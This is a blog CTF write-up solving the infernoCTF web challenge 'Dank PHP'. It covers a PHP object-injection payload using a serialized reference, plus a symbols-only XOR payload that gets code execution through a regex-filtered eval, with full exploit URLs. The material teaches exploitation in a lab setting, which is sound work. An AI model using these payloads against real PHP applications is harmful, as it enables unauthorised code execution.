
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      <link rel="icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.1.5">
    
    
      
        <title>Dank PHP - lmkalg's blog</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.ee0f47ba.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.e6a45f82.min.css">
        
      
    
    
    
      
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="none" data-md-color-accent="none">
  
    
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#challenge-data" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="lmkalg&#39;s blog" class="md-header__button md-logo" aria-label="lmkalg's blog" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            lmkalg's blog
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Dank PHP
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="lmkalg&#39;s blog" class="md-nav__button md-logo" aria-label="lmkalg's blog" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>

    </a>
    lmkalg's blog
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        Home
      </a>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2">
          DeFi
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="DeFi" data-md-level="1">
        <label class="md-nav__title" for="__nav_2">
          <span class="md-nav__icon md-icon"></span>
          DeFi
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_1" type="checkbox" id="__nav_2_1" >
      
      
      
      
        <label class="md-nav__link" for="__nav_2_1">
          Damn Vulnerable Defi
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Damn Vulnerable Defi" data-md-level="2">
        <label class="md-nav__title" for="__nav_2_1">
          <span class="md-nav__icon md-icon"></span>
          Damn Vulnerable Defi
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../DeFi/damn-vulnerable-defi/unstoppable/" class="md-nav__link">
        Unstoppable
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../DeFi/damn-vulnerable-defi/naive_receiver/" class="md-nav__link">
        Naive Receiver
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../DeFi/damn-vulnerable-defi/truster/" class="md-nav__link">
        Truster
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" checked>
      
      
      
      
        <label class="md-nav__link" for="__nav_3">
          CTF's
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="CTF's" data-md-level="1">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          CTF's
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_1" type="checkbox" id="__nav_3_1" >
      
      
      
      
        <label class="md-nav__link" for="__nav_3_1">
          Hack the Box
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Hack the Box" data-md-level="2">
        <label class="md-nav__title" for="__nav_3_1">
          <span class="md-nav__icon md-icon"></span>
          Hack the Box
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../hackthebox/registration/" class="md-nav__link">
        Initial registration to HTB
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../hackthebox/bashed/" class="md-nav__link">
        Bashed
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../hackthebox/valentine/" class="md-nav__link">
        Valentine
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../hackthebox/poison/" class="md-nav__link">
        Poison
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../hackthebox/celestial/" class="md-nav__link">
        Celestial
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../hackthebox/canape/" class="md-nav__link">
        Canape (favourite)
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2" type="checkbox" id="__nav_3_2" >
      
      
      
      
        <label class="md-nav__link" for="__nav_3_2">
          My challenges
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="My challenges" data-md-level="2">
        <label class="md-nav__title" for="__nav_3_2">
          <span class="md-nav__icon md-icon"></span>
          My challenges
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_1" type="checkbox" id="__nav_3_2_1" >
      
      
      
      
        <label class="md-nav__link" for="__nav_3_2_1">
          Ekoparty 2017
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Ekoparty 2017" data-md-level="3">
        <label class="md-nav__title" for="__nav_3_2_1">
          <span class="md-nav__icon md-icon"></span>
          Ekoparty 2017
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../own/eko2017/kidnapped/" class="md-nav__link">
        Kidnapped
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_2" type="checkbox" id="__nav_3_2_2" >
      
      
      
      
        <label class="md-nav__link" for="__nav_3_2_2">
          Ekoparty 2018
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Ekoparty 2018" data-md-level="3">
        <label class="md-nav__title" for="__nav_3_2_2">
          <span class="md-nav__icon md-icon"></span>
          Ekoparty 2018
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../own/eko2018/kidnapped_revenge/" class="md-nav__link">
        Kidnapped the Revenge
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_3" type="checkbox" id="__nav_3_2_3" >
      
      
      
      
        <label class="md-nav__link" for="__nav_3_2_3">
          Ekoparty 2019
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Ekoparty 2019" data-md-level="3">
        <label class="md-nav__title" for="__nav_3_2_3">
          <span class="md-nav__icon md-icon"></span>
          Ekoparty 2019
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../own/eko2019/secret_spy_message/" class="md-nav__link">
        Secret Spy Message
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../own/eko2019/rich_text/" class="md-nav__link">
        The Rich Text
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../own/eko2019/defuse_bomb/" class="md-nav__link">
        Defuse the bomb
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../own/eko2019/guess_my_number/" class="md-nav__link">
        Guess my number
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_3" type="checkbox" id="__nav_3_3" checked>
      
      
      
      
        <label class="md-nav__link" for="__nav_3_3">
          infernoCTF
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="infernoCTF" data-md-level="2">
        <label class="md-nav__title" for="__nav_3_3">
          <span class="md-nav__icon md-icon"></span>
          infernoCTF
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
        
      
      
      <a href="./" class="md-nav__link md-nav__link--active">
        Dank PHP
      </a>
      
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../register_x/" class="md-nav__link">
        Register X
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../really_secure_algorithm/" class="md-nav__link">
        Really Secure Algorithm
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_4" type="checkbox" id="__nav_3_4" >
      
      
      
      
        <label class="md-nav__link" for="__nav_3_4">
          Ekoparty 2020 main ctf
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Ekoparty 2020 main ctf" data-md-level="2">
        <label class="md-nav__title" for="__nav_3_4">
          <span class="md-nav__icon md-icon"></span>
          Ekoparty 2020 main ctf
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../main_ekoparty_2020/leak/" class="md-nav__link">
        Leak
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../main_ekoparty_2020/docs/" class="md-nav__link">
        Docs
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../main_ekoparty_2020/env/" class="md-nav__link">
        Env
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../main_ekoparty_2020/head/" class="md-nav__link">
        Head
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../main_ekoparty_2020/mod/" class="md-nav__link">
        Mod
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../main_ekoparty_2020/INF/" class="md-nav__link">
        INF
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../main_ekoparty_2020/cheater/" class="md-nav__link">
        Cheater
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
      
      
      
      
        <label class="md-nav__link" for="__nav_4">
          Tiny Tools
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Tiny Tools" data-md-level="1">
        <label class="md-nav__title" for="__nav_4">
          <span class="md-nav__icon md-icon"></span>
          Tiny Tools
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../tiny_tools/almost_sudo/" class="md-nav__link">
        Almost sudo
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../tiny_tools/pastemon/" class="md-nav__link">
        Pastemon
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../tiny_tools/quickxor/" class="md-nav__link">
        Quickxor
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
      
      
      
      
        <label class="md-nav__link" for="__nav_5">
          Arduino
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Arduino" data-md-level="1">
        <label class="md-nav__title" for="__nav_5">
          <span class="md-nav__icon md-icon"></span>
          Arduino
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../arduino/robot/" class="md-nav__link">
        Robot
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
      
      
      
      
        <label class="md-nav__link" for="__nav_6">
          Revering Windows ETW
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Revering Windows ETW" data-md-level="1">
        <label class="md-nav__title" for="__nav_6">
          <span class="md-nav__icon md-icon"></span>
          Revering Windows ETW
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../../etw/introduction/" class="md-nav__link">
        Introduction
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content" data-md-component="content">
            <article class="md-content__inner md-typeset">
              
                

<h1 id="challenge-data">Challenge data</h1>
<ul>
<li><strong>Name</strong>: Dank PHP</li>
<li><strong>Category</strong>: Web</li>
<li><strong>Points</strong>: 375</li>
</ul>
<h1 id="solution">Solution</h1>
<p>The statement of the challenge was just a link to a page containing the following PHP code:
http://104.197.168.32:17010/</p>
<pre><code class="language-php">&lt;?php
include &quot;flag.php&quot;;

show_source(__FILE__);

class user {
  var $name;
  var $pass;
  var $secret;
}

if (isset($_GET['id'])) {

  $id = $_GET['id'];

  $usr = unserialize($id);
  if ($usr) {
    $usr-&gt;secret = $flag1;
    if ($usr-&gt;name === &quot;admin&quot; &amp;&amp; $usr-&gt;pass === $usr-&gt;secret) {
      echo &quot;Congratulation! Here is something for you...  &quot; . $usr-&gt;pass;
      if (isset($_GET['caption'])) {
        $cap = $_GET['caption'];
        if (strlen($cap) &gt; 45) {
          die(&quot;Naaaah, Take rest now&quot;);
        }
        if (preg_match(&quot;/[A-Za-z0-9]+/&quot;, $cap)) {
          die(&quot;Don't mess with the best language!!&quot;);
        }
        eval($cap);
        // Try to execute echoFlag()
      } else {
        echo &quot;NVM You are not eligible&quot;;
      }
    } else {
      echo &quot;Oh no... You can't fool me&quot;;
    }

  } else {
    echo &quot;are you trolling?&quot;;
  }

} else {
  echo &quot;Go and watch some Youthoob Tutorials Kidosss!!&quot;;
}
&gt;

</code></pre>
<p>I'm not good a PHP, however I decided to go over it to practice. </p>
<p>The flag was divided in two parts, so lets go in order:</p>
<h2 id="1st-flag-php-serialization">1st flag: PHP serialization</h2>
<p>For this part, we are only going to focus on the following part of the code:</p>
<pre><code class="language-php">&lt;?php
include &quot;flag.php&quot;;

show_source(__FILE__);

class user {
  var $name;
  var $pass;
  var $secret;
}

if (isset($_GET['id'])) {

  $id = $_GET['id'];

  $usr = unserialize($id);
  if ($usr) {
    $usr-&gt;secret = $flag1;
    if ($usr-&gt;name === &quot;admin&quot; &amp;&amp; $usr-&gt;pass === $usr-&gt;secret) {
      echo &quot;Congratulation! Here is something for you...  &quot; . $usr-&gt;pass;
</code></pre>
<p>In order to get the first part of the flag, we should be able to execute the last line. Therefore, we should met all the previous conditions in order to get there:
1. We need to serialize an object with the format of the class User.
2. We need to send this serialized object thought the <strong>id</strong> parameter.
3. This object should have the value <strong>admin</strong> in the <strong>name</strong> attribute. 
4. This object should have the <strong>SAME</strong> value in the <strong>secret</strong> and <strong>pass</strong> attributes. 
5. The value of <strong>secret</strong> and <strong>pass</strong> must be the value of <strong>$flag1</strong>, which is totally unknown for us. </p>
<p>To start we need to serialize this object. How serialization works in PHP? No idea.
I came across this <a href="http://irq5.io/2019/01/07/35c3-ctf-write-up-php/">blog</a>, which explain a little about it. However, the most important resource I got from here was the tool <strong>php-cli</strong> who let me test my own PHP code :). So now, instead of forging the PHP serialized object manually (first idea), let's let PHP forge it for us :). </p>
<p>Once downloaded, I start writing my own code: </p>
<pre><code class="language-php">&lt;?php
// Build the same class
class user{
    var $name;
    var $pass;
    var $secret;
}

// Create the object
$user = new User;

// Assign values
$user-&gt;name = &quot;admin&quot;;
$user-&gt;secret = &quot;ANYTHING&quot;;
// Aliasing!
$user-&gt;pass = &amp;$user-&gt;secret;

// Print out the serialized object
echo serialize($user);
?&gt;
</code></pre>
<p>The most important thing from this code was the part of the <strong>Aliasing</strong>. In order to get the same value as the attribute <strong>secret</strong> will have (the value of <strong>$flag1</strong>) we needed to define <strong>pass</strong> as a reference to 
<strong>secret</strong>. </p>
<p>The output of this code was:</p>
<blockquote>
<p>O:4:"user":3:{s:4:"name";s:5:"admin";s:4:"pass";s:8:"ANYTHING";s:6:"secret";R:3;}</p>
</blockquote>
<p>As you can see, after the <strong>secret</strong> part we have an <strong>R</strong>, which I think it stands for <strong>R</strong>eference.</p>
<p>If we know send this object via parameter <strong>id</strong>, we get the first part of the flag:</p>
<pre><code>http://104.197.168.32:17010/?id=O:4:&quot;user&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;pass&quot;;s:8:&quot;ANYTHING&quot;;s:6:&quot;secret&quot;;R:3;}
&lt;strong&gt;infernoCTF{pHp_1s_&lt;/strong&gt;
</code></pre>
<h2 id="2nd-flag-non-alphanumeric-code">2nd Flag: non-alphanumeric code</h2>
<p>Once we are here, we can kind of forget of the previous part and just focus on the following piece of PHP code:</p>
<pre><code class="language-php">if (isset($_GET['caption'])) {
    $cap = $_GET['caption'];
    if (strlen($cap) &gt; 45) {
        die(&quot;Naaaah, Take rest now&quot;);
    }
    if (preg_match(&quot;/[A-Za-z0-9]+/&quot;, $cap)) {
        die(&quot;Don't mess with the best language!!&quot;);
    }
    eval($cap);
    // Try to execute echoFlag()
}
else {
    echo &quot;NVM You are not eligible&quot;;
}
</code></pre>
<p>At first, to solve this, I thought the following possibilities:
1. Bypass the regex. 
2. Exploit some vulnerability in <strong>preg_match</strong>. 
3. Execute some code only written with symbols. </p>
<p>After some time searching, I found <a href="http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/">this blog</a>. Which was basically executing PHP code, only using symbols by doing some interesting trick with XOR.</p>
<p>However, his trick was using a large amount of chars, and I only had 45 as maximum).
Therefore, I built my own payload, using his trick. Let's first explain a little bit about it. </p>
<h3 id="the-trick">The trick</h3>
<p>Quick and dirty explained, the trick consists on definint a variable as a symbol, and then xoring it with another symbol to get the letter you want. For example, if you XOR the symbols <strong>}</strong> and <strong>&lt;</strong> you get a <strong>G</strong>:</p>
<pre><code class="language-php">&lt;?php
$_=&quot;{&quot;;
$_=($_^&quot;&lt;&quot;);
echo $_;'
&gt;
</code></pre>
<p>The answer will be <strong>G</strong>. </p>
<p>Therefore, going back to our example, my idea was to use this to build the string <strong>echoFlag();</strong> which would be executed later on by the <strong>eval</strong>. </p>
<p>We had to find a combination of symbols that once xored, will write the each of the letter of <strong>echoFlag</strong>. In order to get that I wrote a tiny and dirty python script:</p>
<pre><code class="language-python">def get_symbols_for(needed_char):
    symbols = &quot;!\&quot;#$%&amp;\'()*+,-./:;?@[\\]^_`{|}~&quot;
    for symbol in symbols:
        blah = chr(ord(symbol) ^ ord(needed_char))
        if blah in symbols:
            print(&quot;Symbols {} and {} can be usd for char {}&quot;.format(blah, symbol, needed_char))
            return
    print(&quot;No symbols found :(&quot;)

for char in &quot;echoFlag&quot;:
    get_symbols_for(char)
</code></pre>
<p>Once executed the answer was: </p>
<pre><code>Symbols @ and % can be usd for char e
Symbols @ and # can be usd for char c
Symbols @ and ( can be usd for char h
Symbols @ and / can be usd for char o
Symbols = and { can be usd for char F
Symbols @ and , can be usd for char l
Symbols @ and ! can be usd for char a
Symbols &lt; and [ can be usd for char g
</code></pre>
<p>Cool. Now we have which symbols we need to xor to get our string. </p>
<p>Let's test locally if this will work: </p>
<pre><code class="language-php">&lt;?php
function echoFlag(){
    echo &quot;It has been called!&quot;;
}

$cap = '$_=(&quot;%#(/{,![&quot;^&quot;@@@@=@@&lt;&quot;);$_();';
eval($cap);
?&gt;
</code></pre>
<p><strong>This is the last version, I went trough some intermediate states that I don't thing are relevant</strong>.</p>
<p>Once executed, the output was:
<strong>It has been called!</strong>. </p>
<p>Meaning it worked successfully!
Let's send this payload through the <strong>cap</strong> parameter (don't forget to send the payload of the first part as well!)</p>
<pre><code>http://104.197.168.32:17010/?id=O:4:&quot;user&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;pass&quot;;s:8:&quot;ANYTHING&quot;;s:6:&quot;secret&quot;;R:3;}&amp;caption=$_=(&quot;%#(/{,![&quot;^&quot;@@@@=@@&lt;&quot;);$_();
&lt;strong&gt;infernoCTF{pHp_1s_&lt;/strong&gt;
</code></pre>
<p>Buhh! It didn't work. After some time, I figured it out that was because the <strong>#</strong> wasn't encoded :|. 
Let's try again: </p>
<pre><code>http://104.197.168.32:17010/?id=O:4:&quot;user&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;pass&quot;;s:8:&quot;ANYTHING&quot;;s:6:&quot;secret&quot;;R:3;}&amp;caption=$_=(&quot;%%23(/{,![&quot;^&quot;@@@@=@@&lt;&quot;);$_();

&lt;strong&gt;infernoCTF{pHp_1s_&lt;/strong&gt;
&lt;br&gt;
&lt;strong&gt;a_h34dache}
</code></pre>
<p>Yess! Here is the second part of the flag: <strong>ia_h34dache}</strong>
And we use only 32 chars instead of the max 45 (;))</p>
<h1 id="flag">Flag</h1>
<pre><code>infernoCTF{pHp_1s_a_h34dache}
</code></pre>

              
            </article>
          </div>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
    <nav class="md-footer__inner md-grid" aria-label="Footer">
      
        
        <a href="../../own/eko2019/guess_my_number/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Guess my number" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Previous
              </span>
              Guess my number
            </div>
          </div>
        </a>
      
      
        
        <a href="../register_x/" class="md-footer__link md-footer__link--next" aria-label="Next: Register X" rel="next">
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Next
              </span>
              Register X
            </div>
          </div>
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
          </div>
        </a>
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
